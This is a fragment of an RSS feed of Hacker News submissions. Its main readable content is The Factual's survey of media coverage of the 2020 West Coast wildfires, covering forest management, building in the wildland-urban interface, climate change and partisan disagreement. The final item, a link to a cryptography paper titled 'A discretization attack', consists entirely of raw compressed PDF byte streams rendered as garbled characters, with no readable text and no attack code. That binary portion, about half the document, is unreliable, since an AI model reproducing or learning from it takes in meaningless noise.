<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</a></em></p>]]>
            </description>
            <link>https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522322</guid>
            <pubDate>Fri, 18 Sep 2020 22:03:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Climate Change Responsible for This Season's Wildfires?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24521994">thread link</a>) | @amoorthy
<br/>
September 18, 2020 | https://blog.thefactual.com/climate-change-wildfires-oregon-california | <a href="https://web.archive.org/web/*/https://blog.thefactual.com/climate-change-wildfires-oregon-california">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_151456960811572" data-hs-cos-general-type="widget" data-hs-cos-type="module">
    <div>
<div>
<div>
<div>


<div>
<div>


<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>The recent HBO miniseries <em>Chernobyl</em> captured a key moment in which human protagonists are confronted by the scale of a disaster. During this unprecedented man-made incident in 1986, nuclear scientists at a damaged nuclear reactor struggled to assess the danger from radiation, especially because the geiger counters on hand — devices meant to measure levels of radiation — <a href="https://www.jstor.org/stable/10.5612/slavicreview.74.1.104?read-now=1&amp;seq=9#page_scan_tab_contents" rel="noopener" target="_blank"><span>didn’t go high enough</span></a> to measure the amount of radiation leaking into the environment. The radiation essentially exceeded what the scientists had tools on hand to measure.</p>
<!--more-->
<p>This week, the fires across the West Coast highlighted our own inability to comprehend the scale of a disaster scenario, with air quality in parts of Oregon <a href="https://www.oregonlive.com/news/2020/09/portlands-air-quality-is-off-the-charts-on-sunday-and-much-of-oregon-is-just-as-bad-due-to-wildfires.html" rel="noopener" target="_blank"><span>exceeding</span></a> the Environmental Protection Agency’s 500-point AQI scale. Previously, events that put the AQI at 300 were “extremely rare”; in recent days, the AQI in places like Eugene, Oregon topped 700, essentially <a href="https://grist.org/climate/oregons-air-quality-is-so-far-beyond-hazardous-that-no-one-knows-what-it-means-for-health/" rel="noopener" target="_blank"><span>unfamiliar territory</span></a> in terms of air quality.&nbsp;</p>
<p>Though not quite the same as a nuclear meltdown, we are similarly unprepared to answer key questions about the crisis: What are the <a href="https://www.vox.com/21427857/california-wildfire-2020-oregon-washington-air-quality-smoke-orange-red-sky-health" rel="noopener" target="_blank"><span>health impacts</span></a> of exposure to this air? What are the long-term effects of fires in forest land that <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>shouldn’t typically burn</span></a>? And above all, to what degree is human activity, via climate change or other mechanisms, responsible for such natural disasters?&nbsp;</p>
<p>This week, The Factual surveyed 29 articles from 23 news sources across the political spectrum to see how the media is talking about the West Coast’s mega-fire season, including views on how and to what degree human activity is responsible for seemingly apocalyptic scenarios.</p>
<h4><br><strong>A Wild Wildfire Season</strong></h4>
<p>Given the <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>unprecedented scope</span></a> of this year’s wildfires on the West Coast, a common question is why this wildfire season has been quite so bad. A cursory glance at headlines and comments by national figures would lead one to believe that there is a simple dichotomy, with the political left blaming climate change and the right blaming bad government policies. In reality, there seems to be some broad agreement on the key factors at play: (1) a problematic approach to forest management that has led to greater fire risks, (2) human behavior that makes fires more dangerous and more likely, and (3) a warming climate. Only when measuring to what degree changing climate is responsible, and the fundamental reasons for why climate is changing, does real disagreement emerge.</p>
<p>A big misconception about fires is that they are inherently dangerous and/or bad for the environment, but the reality is that they are an <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>essential part</span></a> of ecosystem renewal and healthy environmental progression. In a natural scenario, many forest habitats should burn on a regular basis, clearing the underbrush while leaving larger trees mostly unharmed. But a longtime misdirected approach to fire management on the West Coast has prioritized <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>putting out</span></a> fires quickly to protect growing human populations. However, this strategy has not been accompanied by enough controlled burns to limit growing fire risks and maintain normal ecosystem renewal.</p>
<p><span>"Part of the difficulty is that California’s climate provides only limited periods of time when crews can safely light fires to manage forest health. The conditions must be dry enough for vegetation to burn, but not dry enough to risk a runaway blaze." - <a href="https://www.sfchronicle.com/california-wildfires/article/Are-climate-change-or-poor-forest-management-15564031.php" rel="noopener" target="_blank">San Francisco Chronicle</a></span></p>
<p>While the safety rationale of the choice not to burn seems straightforward, it can perversely have the opposite effect. If an ecosystem does not burn, the underbrush continues to build up, making the next eventual fire <a href="https://www.nationalreview.com/2020/09/california-forest-mismanagement-a-disaster/#slide-1" rel="noopener" target="_blank"><span>hotter and more dangerous</span></a>. As the fire intensity increases, trees that shouldn’t burn go up in flames and smaller, low-intensity fires become fast-moving disasters that endanger natural ecosystems and human settlements alike. In this way, man-made policies have helped make the West Coast a tinderbox.</p>
<div><p>Further aggravating this risk is human behavior. As populations and urban areas grow, humans have expanded ever-outward, encroaching on and living in heavily-forested areas. This has increasingly placed populations in danger from wildfires. Forest management has been consistently <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>under-resourced</span></a>, and landowners aren't always <a href="https://arstechnica.com/science/2020/01/why-isnt-california-using-more-prescribed-burns-to-reduce-fire-risk/" rel="noopener" target="_blank"><span>willing</span></a> to respond with the measures needed to mitigate fire risks. In California, for example, the state only owns <a href="https://www.kqed.org/science/1927354/controlled-burns-can-help-solve-californias-fire-problem-so-why-arent-there-more-of-them" rel="noopener" target="_blank">57% of forested land</a> and cannot obligate private landowners to use controlled burns to mitigate fire risks.</p></div>
<p><img src="https://lh5.googleusercontent.com/zxd_ypEby-bddzFmqsD5-961ZgOYuNCl08ZrzIsbA-JrHcczJEKfI32SXmpV7vj56YKlrEHixxzC0uvbbswH1LTdWmNQwimnRzsJOJ4hfe7DfOa_yc3LKRD03j6u1e1lJRmuA4_-" width="578"></p>
<div><p>The WUI, or wildland-urban interface, is the area where human settlement and wildlands intermix. These are areas were human structures are in close proximity to land prone to wildfires. Source: <a href="https://www.nrs.fs.fed.us/news/release/wui-increase" rel="noopener" target="_blank"><span>USDA</span></a></p></div>
<p>Factors such as lower housing costs and a desire to be closer to nature have <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>helped encourage</span></a> the development subdivisions and individual homes well into the forest. To make matters worse, as these populations (and people from across the states) spend more time outdoors and in these forests, the risk of fire goes up. The ever-increasing levels of human activity is accompanied by an ever-higher risk of fire.</p>
<div><p>Finally, the overall climatic conditions cannot be ignored. 2020 promises to be one of the <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>hottest years on record</span></a>, and this year’s fire season vigorously kicked off on a record-hot Labor Day weekend, partly because of a freak lightning storm in California (with over <a href="https://abcnews.go.com/ABCNews/million-acres-burned-california-firefighters-brace-lightning-storm/story?id=72551511" rel="noopener" target="_blank"><span>12,000 lightning strikes</span></a>) and partly because landscapes across the West Coast were uncharacteristically dry — even for fire season.&nbsp;</p></div>
<p><img src="https://lh6.googleusercontent.com/Sfqjx4sJ4aGT8ibajU93V7ZjH8HOQ8P0Th_NDP77MSdgLymRRRWv-8soEftHsKo7mmpODdIl2yHjPlGWaUWNnJLEop01ql63y_hzOWOwMZdCfJn6OW9a7tuveBEi7ECcAhyd0xhz" width="600"></p>
<div><p>This map shows how average temperatures in August 2020 contrast with the average August temperatures from 1951-1980.&nbsp; Source: <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>Discover Magazine</span></a></p></div>
<p>It would seem that disputes about whether the world is warming have been replaced with a general agreement that, yes, things are getting hotter. This has obvious, straightforward effects for natural events like wildfires. Higher temperatures mean drier vegetation and potentially even more high-intensity <a href="https://www.oregonlive.com/news/2020/09/oregons-historic-wildfires-the-unprecedented-was-predictable.html" rel="noopener" target="_blank"><span>wind events</span></a>. That this is at least part of the reason for this fire season’s severity is clear to people on both sides of the spectrum.</p>
<p>Where these perspectives diverge is in terms of just who or what is responsible for changing climate. Though President Trump has used the occasion to <a href="https://www.washingtonexaminer.com/policy/energy/trump-says-world-will-start-getting-cooler-as-biden-criticizes-him-as-a-climate-arsonist" rel="noopener" target="_blank"><span>cast doubt</span></a> on the question of whether climate is changing — something almost all of the articles reviewed for this analysis roundly agree to be the case — the more pertinent divergence regards the degree to which human activity is responsible for the changing climate.&nbsp;</p>
<p>Articles from the political left and center are clear in the science and rationale for linking human activity, particularly the release of greenhouse gas emissions, with climate change — a phenomenon that represents a combination of not just overall warmer temperatures but also increasing weather extremes, rising sea levels, and shifting climatic patterns. In the case of wildfires, this means some articles lay proportionally more blame on <a href="https://www.latimes.com/california/story/2020-09-13/climate-change-wildfires-california-west-coast" rel="noopener" target="_blank"><span>larger climate trends</span></a>, blaming global <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>CO2 emissions</span></a> as much as localized factors like forestry management.&nbsp;</p>
<p>“Many of the phenomena happening now have been predicted for years by agencies like NASA, NOAA and the United Nations, as well as researchers and scientists around the world, who say the only chance of slowing climate change is cutting back or eliminating the biggest producers of greenhouse gases, including cars.” - <a href="https://weather.com/news/climate/news/2020-09-11-extreme-weather-climate-change-disasters-wildfires-flooding-hurricanes" rel="noopener" target="_blank"><span>The Weather Channel</span></a></p>
<p>Many on the political right are still hesitant to conclude that human activity is the driving force behind a changing climate, even if many acknowledge that the climate is <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>getting warmer</span></a>. As a result, much more right-leaning coverage focuses on the direct, <a href="https://reason.com/2020/09/14/western-wildfires-can-be-prevented-if-burdens-on-forest-management-are-eased/" rel="noopener" target="_blank"><span>human reasons</span></a> for the current spate of fire disasters, and <a href="https://today.yougov.com/topics/science/articles-reports/2020/09/15/what-americans-think-about-wildfires-and-climate-c" rel="noopener" target="_blank"><span>roughly half</span></a> of Republicans may think that climate change has not played a role in the current fires.&nbsp;</p>
<p>Ideally, we could better isolate each variable to say how much human movement into forests is responsible for fires and how much is due to a warmer climate, but this is hard to parse from overall trends. For example, across the U.S. we built as many as <a href="https://www.mdpi.com/2571-6255/3/3/50/htm" rel="noopener" target="_blank"><span>32 million homes</span></a> between 1990 and 2015 in the wildland-urban interface — areas where the wildlands intermix with human development — many of which are at increased fire risk. At the same time, fires near Portland are burning forest that has historically been too wet to pose a significant hazard to long-standing neighborhoods.&nbsp;</p>
<p>“What’s different this time is that exceptionally dry conditions, combined with unusually strong and hot east winds, have caused wildfires to spiral out of control, threatening neighborhoods that didn’t seem vulnerable until now.” - <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>New York Times</span></a></p>
<div><p>A positive perspective on the issue might note that both sides, despite clear and vocal differences, actually agree that human activity and behavior make up many of the key reasons for these apocalyptic conditions.</p></div>
<h4><strong>Moving Forward</strong></h4>
<p>As <a href="https://www.chicagotribune.com/weather/ct-weather-smoke-fires-gray-sky-20200914-kpmxe2i2gjhahocfpd7zwovqt4-story.html" rel="noopener" target="_blank"><span>smoke wafts</span></a> across the U.S., there may be greater impetus to drive higher-level reform to address these growing issues. There are many reforms that both sides can agree on. Above all, we need to <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>modify land management practices</span></a> and divert more resources to both fire response and prevention. For example, as the risk of fire has increased, funding that should be used for fire prevention has been shifted to firefighting. Cumbersome regulatory hurdles have slowed the implementation of controlled burns, and private landowners <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>can still reject</span></a> such preventative action, often fearful of <a href="http://sacbee.com/news/california/article239475468.html" rel="noopener" target="_blank"><span>liability</span></a>. Measures like <a href="https://slate.com/business/2018/11/california-houses-rebuild-camp-fire-design.html" rel="noopener" target="_blank"><span>increasingly fire-proof</span></a> homes can help, but only go so far.</p>
<p>“Forest Service spending on fire suppression in recent years has gone from 15 percent of the budget to 55 percent – or maybe even more – which means we have to keep borrowing from funds that are intended for forest management.” - <a href="https://www.usda.gov/media/press-releases/2017/09/14/forest-service-wildland-fire-suppression-costs-exceed-2-billion" rel="noopener" target="_blank"><span>Secretary of Agriculture Sonny Purdue</span></a></p>
<p>Below this common ground, larger disagreements promise to persist, especially about climate change and its role in the current conflagrations. A host of policy actions that the political left targets, such as reducing …</p></span></p></div></div></div></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thefactual.com/climate-change-wildfires-oregon-california">https://blog.thefactual.com/climate-change-wildfires-oregon-california</a></em></p>]]>
            </description>
            <link>https://blog.thefactual.com/climate-change-wildfires-oregon-california</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521994</guid>
            <pubDate>Fri, 18 Sep 2020 21:21:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A discretization attack [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 13 (<a href="https://news.ycombinator.com/item?id=24520781">thread link</a>) | @Kubuxu
<br/>
September 18, 2020 | https://cr.yp.to/papers/categories-20200918.pdf | <a href="https://web.archive.org/web/*/https://cr.yp.to/papers/categories-20200918.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div îœj="">Äûgó
†Æ~mL÷}¯î®)ç{MJÅªÚé^“2ñcéCQ®²^¥ºJŒ–É21zùíe*´Lüå&lt;«Òˆ ÎéÚ¾‘ìò�qS`w�ˆÆ¢E.œÂž=â$}Ý¤˜j´wP¨Š3ñ¨$700D‹ì)þvAæÝ”ƒG
È…q=zòwÏréŒê¬8±‘–“
'L&gt;£FÁoQ&gt;€ŽZ&amp;N/&gt;Mçžn0'YŠ²-*ˆµÅ\&lt;§Xjrâ5SÔæk‰Ââ[‰ÿ�
£N&amp;É¶6ÒJù”E%P«Öh‹êï-÷''÷îýÖž}ñ&lt;ÇcHî-‡«G¨.¹”ÇÝk_·Cì² ´å	,ßqìK½ø-)‘Ø×R¨ÂK=�AX&lt;
ûÁcÉiƒ�?nŠ×TïiämUÁ\p‘õBìå6o(æbÕ{À¹��†)O…#Äªœ“@ØÑÜàÁZà.pÅ¶²Æd÷·D\¼…uÑE5¿KÒõ4&amp;¾5
UÇCW…rË£•n:xît4ddp„ükh�,†gî-¹Fö¤Ž‰�óR9W%ùœìfwöÉ/•HI'Ð½mk4šˆ°”ˆÀi|lÑMG¸ò.9ð�†8¸ÈñBÄC8åq&lt;ËêÄ£�eÐ5-3`g1§WR&nbsp;³˜¨(H fO‚,’û¾Œo.’òcpŽáq^È¨&lt;ˆ)Í»È$Ñ*Å…k#`XCX(„¦\l{ýã“ Fß9	
?ëÝTD·î(®*ÈM\Š•ª¹T Q2@ødOñ'RE‘j
Ür‰ˆ(vù·&amp;$„pç'®üŸ7EÆ¬‰ö¤�¥~‡¡š#8Y*4ÿ²ðÍð'2&gt;…
!ÙëÒ‘(WX›áƒ´ýIÒ¤Ë_P�k
˜þ‘­N?:¿.«:•0Ó¸Ãô5V/£îë^ù¿äžLÃ
endstream
endobj
49 0 obj
&lt;&lt;
/Length 2629      
/Filter /FlateDecode
&gt;&gt;
stream
xÚµÙ’Û¸ñÝ_1•—PU#š÷á—­Äkg7©rycm^â&lt;`HHbL‰Zgüõé&lt;4œqì$5UÃFh4}+ô£›þBùV§ÁÍ€?½øãîÅË·qpSøe–%7»ýMTæç7YœûY^Þìê›¿{Ølã$öêÆT½¶Í—Mè)ÛtgF+kUµ‰JïŒÃ&lt;öâÍ?vÏxù¶¸)�f”!ým~Ä¤~D|ÀOÝ&amp;*¼Ï›(÷ô=‚º¿biêÙ£î5‚™Ww›-Nž;ËKÔåÂªçÛñÄ£yéõ}Ó
†§ÚÆê^ÙÁÑf
]sÆÃms&gt;ð²n°Bò¨Fn¯ñ†p»múešñ%.=3Xiƒ§”¥×íñ˜î´Ù†pÈ­gâ0[õÛ™cõI6TêÌÀÄ:lç `DÖxøË·I6kg~Ï0+ú^¡$,¼fÏ_�#'Ý7–ÁNæô&amp;Æª#]jëHñÝR&amp;8çåPxGE¢Ì�Õ4dx&amp;NU8èú~œ¨lûÀ‹•1 BÊ5æÊæ‰ŸF…»…Ï…Yìy¸dè×s­{cÕ¹fy‚tèŠq4Ê« …„�&lt;®1Í]ß�ÁQ-˜ëõoCÓ;¼±Cý dG6ÇW¼ÀóÐ{æ+ô“4_²5×Í#õvÇé&amp;&nbsp;d
9ïy¼—µƒ¡“a-›T
u¡ã@ep{8NÍOpÛ&gt;7&nbsp;•D’™Ô¾k[6*¾&nbsp;HFŸAïÛ…ú
ëæ¨ÄŽ^]Ùo˜ÌÞ(óË&lt;��€‰Dñ?aþŒÉ#»7Ý±Ð#ô¸ß&nbsp;÷l�ˆXjbàÖîU+«ÐÌñ;Ú
m%©éÚçáëîlšš¼I”$žöþ­ì&gt;ê5)´&nbsp;<m¥·wÊ€¡�?@dÄû»0ôÌpwj@™€4 ß¾Î²'â¥ä�p="�ï~þ°ã©÷º�Ýþ2(ö:Ãi�¡×$‹C¯.G\…vÇÞÔ|Õ×ÍçˆùU\Ô?ueó1H<òý/¯" ýçvËï´8ü[^ö="" Û(beËq¸àÞÃ0fñÇè8¦kà�Ü®w½:i‹ÖÂ«¬yÅ <#‚$ómÄƒ¿<Ü9[‘äâ|v¡óË$sw™owºoÃè±�jr?ˆÇkÃ+¬�Š€t.håyñ­ä›i…a”¬ËgÆ@<izŸ�m«%…ƒw»¿¢,~—%~‘gß&®À��’ãÎ¶Ži‘åcæòÜ�Ëè+7Ša¹b1Ëóÿ‚bqe1="" Ê¬ˆÂï£¦ùe\.#?qî�Éƒ²iî§Ó#?o‚yî'eþý6(Þ5É¯�Èatü1Íš‹!°}s½b´3&ÀwÍxý="" ;íðyjfÝ017m˜Ódü¾Œæ„åø„Î]ú)Š�ðÕ="" Úayò¾€"’0ûq="" wg�nßicl³-«ÿ«—Û¹¤!b¦Á–="" uŒqü1º0Éw="" k(ýc¡ƒÛ_1^d�›^w½Þ~øÛûm‘x="">£&amp;™ãh&amp;s&gt;Ä2
`´[þ?”¹&amp;n`›.”»øsý‰èÔ.ûïË@»’È£L�Ùj9YO°<qvñü2›7·< “b€ iˆºð_rˆž— í="" ¶,ôÙ­liüükÌž2óaŽr×ÓËz="" §Ç»e%oüzÞ«="" xt×Æ¼{‹)¶{,”cÇ#Å¦lvl³ý2Î%³k�Äñy“2�Üuîy”pdf¢Ž£z[Õ´2e‘¼”ô�vË¤v—[&uì�íÏb—o\="">"#éÚÐe¼,×C×"žÝˆ“afWu]�¦%Eh‘¢Ã‚Ÿ”„&nbsp;¨‰+„ÜÇ0N¸&amp;&amp;ïƒÎçB�’Ü!xæ•SEò;W«P=	Ð¡á‚×ðÊ'ÒÒYIã¸‹QœÝª»V3F„&amp;Õt!+Cy|»jÁh©ƒ1ÉC¡Â4—r_-Ë�B,mã�Ò�ÍÝ¦ˆñâq–yMÛÆöL3Ë�«È²&amp;oyÉ—âªˆqP·=êbÏÏÊ1BŸÔYîPóº3Lìå1”o÷k…û˜mã"b¾îGáfJ+oAþ!.ÂÃ0ˆyòŠá‚ÃÌ/†ñ’aXGÃÄÈp~Í°ˆ™ÃG,Æ]ÉçáÄ'þXÅºdx¨øs×wªvTÚŽÝÎ'Ybe'W3Ñ¼1Á•Ñ…•³2�Ãƒ¬GE«Gb+7³cH¼U­÷úlÄ×±:&nbsp;€gí[«Àßu¨pQT’�a±z‹½
Dý8`ôCèÍkž™´Ão“ýSÇ(bË¹êÒYŠüˆšjPÌû¸ÌªþÅ‹ÿtÛ@PÍüìï³2Œ¹Ús¯;U„�G‰JVM�$,œ&amp;a¤sÇ3¦ÍçtØ‹[³
jZN�¼‚:yÎh‚@‚,1ÍéÒ6•‹§à1d…xX2�68£ŒNZ&amp;ÅwÎMÁü²=pëˆ¸(»ÖíÐ”DØt£PÛAÕÏcŒZøåD!*Ém¾¶|‘$ f±Íé&gt;Â³”­’ñÃ™LA{ìÌj$`¢†{SÇÉµI“Š»¢SZBÉ²3°tÐçŠžó„1?�õ¸®Z�½ÈŸ…è©9PBb—ÑÔ
„ú¸¶Y/î	û&amp;ã*s¯E'Áþ™è.N±yJÌ«Ì=ñ¿&lt;§çfx6³W&lt;ÙìùYdƒðRZ|B+{�‚q�ž¯¥xÆ1POÛŸ¾dúH%R$š_½å)4Eê7ã€[B²iüÙ&amp;;{Q¡À© BcJ…‘g:ñõˆàš�ØŽ|	ÈÀðwßcú„PÕõ½–¦.
)°q’@ÊÄ»X½î&lt;µ;Êš“âb¢¸ÊøG4"Ú3ß°â‹(_Í]Ã&gt;ÉAó-cx´H™ÆHµ*]Sœ{,iÄZÎæœböÕÎ)ïÍ¥ƒß£8C¦rt¼‘Ã^ù"AˆËÑ�—R«aäéû†}w‰?NÜ2äzÂõPÁ+ÒÕ–qé\8Rì›OòP˜ÃƒÅPÏ‚
É£¡…c(f'²Âî”T@øˆ¤,9KÍ±˜ŒŸ×äYÊ„oXŽµ
0e$í„IJŒ`²»3ºç¨Â	°Ät'Áñ�.ÉŒ@ÆM»LºJê,ogùÔ“!rí
RéúP²Òã&nbsp;aÕªæ4NÕš!0MFÀÆ˜Ñí,Ý`Ü½høÓ½ƒ|ÞÏ¤1K7ŽéÝ³ïRô.XV±
»B0(ŠBîÁÅf1Y/,á+Ý2ÎèÔQí	r6ÙÞJ»ãyá¢
×ZúIeÅd÷ªâÔ&gt;¤ŸøðËÌeá‚¹,™�™óyð“ówD¤©ñfXí‘\GÕA”}‚ä&lt;øÑQQç¯dþ!þÙ&gt;H�?ãï¦Ò«§©YðÂ1ÕÏI¸t0€ç; 4«³atRŸ¤ñ¹Ÿ$�…õ”aºØâ×Í7ö·í�u;Ž]wì¹®{ü¡©^¶}fÖ�xé²éã¾ov/þ
¬&lt;þe
endstream
endobj
79 0 obj
&lt;&lt;
/Length 3415      
/Filter /FlateDecode
&gt;&gt;
stream
xÚ­koãÆñ»…�&nbsp;ˆH{Ü_WäÃ]’K´A{ç´.÷�’ÖkŠTHÊŽúë;/R$M_ê´0`ÎÎwgggçEieüiynWÁâ€ï¯ÞÞ\½zgƒE¢Ò(r‹›ÛE+
PdcÅéâf·ø¸t×k«c³ü6+s_ÀÀÙå
ŸfùÖ×eÓú¼¼þtóC?ï«w&amp;]h­Ò048k°X›P¥�á	ÍõZk.ßÀq¸ÜV‡cVçMUòøëOEÖú#ÚŠŸ·ÙµÕËüWÕŒúñæýµ5ËŸpùWï’E
;1Q·¦U©Ö¼æ›$7Q´ÌËÛª&gt;dmŽË™(Ú}Þ0Ôøí…¼�G¼ôEu
�ÇŽÕ3p[BÈË;Fy)DžhuÞ¶¾ì–MÃvL²¬ò­¼TÝ2:Ãá&amp;X�¼‰=òž�À¯Àm¾Íð@`øãŸ?Ü /k/uË¤v­—™XÙ¾éHž_jò¤—kØû	ä¥…˜´ËÚŒ¹e^Ø¾*SÜÖÕ�?Š
Ê�à5šƒïÑ"\&lt;8kµŠ4Ú—'æ3<hp€ãŽõémpÑx;·h.±Ë ÏÚ%nyw§r·6Œƒ}ùõ&kÐ°�îËm}="">òY#KsÚò¦�q³bŽ-Ì@»¥óEž›}íý[ŸÕ
sdÍÜI�ƒ»bÂÞô°F:’q‘FcÒ¨	6 ¾@ŸÚ9[÷»ôIk�‘Mc{@èàÛ:ß²d?aPg`45ÓÚ}VŽ^Ûž·…_÷Jã³Òa¤tªÇ
âiaB
š¶‘Y6l]~›ÿhv]œ™°Í�°`ëm…‘D³‘‰ƒçsï˜å±85�6E¾]ß£¤dûçÑAF,'¾)R:‹�ÙnY«a¬ÿõXd9Ü²’&amp;Ú1ž#&gt;_rŽ6U	¨èåç¸âµ&gt;ø-J &amp;
£ì'Åà
98”·wpˆ¾¸[¡¢S�ƒÓÊj3&gt;¸‹·^±ÓuÑ@¨0TÎšN¨Ç¼ÝW'&lt;0ž~ºJ6ŒÅû	n©¯‹³’Îå„èrB�÷£mžzx$*I“�¬µ,¬Ã`ËÞµf¸g?)Òêw7W¿\i�]ÜaÊÀhŒ‘?‹ÐÀ"”…U‰ó°°.T‰A½‹WÇsE9WßKdué@Ú$QÌìR§R#Æus�ÞjS�;Ö	–f +1ôé0†1GÜøm_¶Laå-´aÜmE\Œï�R&amp;ÎéCç‡,Íù¡‘£gã�&lt;Ú³M)&lt;CD/·`<w¼vn²�—æï�Ã¬5Üº$ û="">´Äw4¡˜ó-Ü­{¶œ@¥Šòø9a¢^Xë&lt;çšI°¢óŠù7ý»árçÑù”9jEÈ8�TÀ…oÕ0jO&amp;Vïx”ÉÆß|÷a­MÂÈ¡w!Dãù¥íþµlDyµbšaƒE¤ÒØ&amp;dä`™à­VEºÛLÎ7oh_:T˜m­Œb3ë_NYÙž|²&amp;5�¹‰—jN½I¤ùð˜“,2*Ö,X4’®‘ŸŠ´eÁ„ñk™.d¶ÙàZ$º»ËßÎmÐ¨Ðõ)ƒä"MÛïŽ›í¡!Ó9�ÝÃÑKŒåvþÉ±ù!ogÄÒ&nbsp;®È…Ÿ,V©ë½�âé.6L2\TïÜÄŸ6bÔ&amp;µùS3ÙR7ìÌ<f^�ÝÐwŒÞô ™©5#;z3’Äšd»eÒÅš‡Ø0ÿŸpþ7�Ø5b&Œ˜gÙoŽÙÒÜ5:8äÎÐÁÏ™dÐoÛ9Šµ;b¸ÊÔ¨Ÿb˜€Ýº±°ÿ”kŠqiŸ="÷¼h*ÆÝ��*lÀPŠ¬ó³À5ÔrÃ<˜Ä#iŸßqrÆSGN½æŠ‘—”èeéY¿Ls;Hëô07Ññ%&amp;È�Uµ=5l›ÀLi€~êÃ§ùÁn��£ø�wyÝ´+!R²­yÓø„À„É$òIÔaü0¾L“,H÷�" jjšfl|[¬]È™3þ%$õŸ)ggvd¬~²Ài~ð.Ýç0Ù‡s‹¶²n&Ìx="õ‘6ÃØÄÜþ×ìp,º)a¯3&amp;?õ·�MuË‚9J®?òXV¤{-‹÷‚b£x�I]UîV<Muª…¥’sËÅ»ŒÄ'ÛGXª9�9‡°PrWÛð–ä6Ñ[mFép<5V+!^êm`¹">@í
Q�•<eó@nz½fŽŸµuÝÒ!ß`¡"bteæ\l[ûòŽ<¸�1`÷{§oµ�„ëÌ˜êÁ×÷yq|ÁÃ—$ê‰vq”v^?tÝ«3¹àÔ��ë¯?òÚ¨>Ë¯v}Q!QÛgí#+‰{4’ë‹�H­2fRó57ËÓŸšÒdox
Ð
žn«îÖÁ ˜áL²VF]Ü‹3b}¯x(~C.­ÀÕ©Ø•_µâŽÜúºÎù€P&nbsp;SÍ§–sÍ¨üv&gt;ÚŒ½k:0i~õ(ÿåâµlÅ…GÊ
O6h2ûÂJ&lt;
”¹t6þ7ÃÀµÑ0òÛ^,	Sér—³y+yy¿bøRÀ@¼ÖJò�R±hìz;-OTŒT°
qÀÍà¿PüÆS¾ü®¤NÀÜgCh3XKÅ]M–õ(u`€©´¬m5wì]Üv&amp;ÇƒPYµìªRP¸èª£vKü|œ�(+ÏÀ.kª¼œqK¨õK™µÏÒT_0ðƒ1)$ø±þ?yÃN•º�Ü(Ã"Ù$cµÕP_î0É³ÝU@ˆ:`-\B¡Ù	@ ¦pÌ7?Çë‰TJ'bL'xL=S|‹#vvð—™ÞsåÏzjÿË)¯=ÈÒÎöÑ.Ö‡OËLÀQû(vT^Â\Î«ÎqáØ®˜
òŒôˆ’ü±}x@|‘ßó­?Ÿt�%l&lt;ä;a”Ä!çR&lt;§7;Õ"öó1×v„ñØä©…õ^âv‚âQßxqÉï¶"É’»	G²S¿‚Î&lt;êÔÒRxBÄ©á³0»Ëò’ê‹8^ž@ó�HäeK‡†tªsâ®	ø©nšmÕ½H­ðx�EÒÔm›mïñ.ã¨»¶ÈN]îÙ&lt;9VZ5Í»C¦n[ÁN,óYÛnƒ]qÅ3HîŒ,ßH¼[øÇß¤l¦)˜
I¨äA’H2±AÊ&amp;Êñ[5sÆÂQÛÍ”2€†õGU!2j&amp;Èµjù4/äHvzi¶ýàB$Ñl•?µ¢i•¯d¡¦¥ÈPVKy8Ð{Y9F…‘ŠÒtšX?-öƒtºÀÌmAãLPÌÿve9ØBxéªÂ´�û|»g�Z¨ðD¡&nbsp;j¡&nbsp;c
A:£ë¡&nbsp;¨¬¨?'¯Ñ�Šb7’×éy1YV†JÙP�±K¿ºäOIn®à@ôXk&amp;²ÓvðpùÁTöåžiðæÀÞ;l’�(œiú—¨ íýÑ×3â�&gt;0Oj°ÏÎËðW0÷L+´*ˆíØD&amp;»Š“é®ÓU8øk†� ¡°«I:‡�#£Ohbù@Op‡nÉ¾‡Ô½E&nbsp;+ôõãëJÚNH÷euºÛÏŒ9Ø0âÎ@°ó"¿¥O!Á%'ÇÁ7Ã&gt;'aŒ¼L-WÚ=ëÎ—¥ïš
¦¢f*û~4�2+fà®ö×ªƒ/±˜qÍÔõ,‰µfë:±,º)È¥¶^˜6(Ñ™aé°ÜyiÝO3
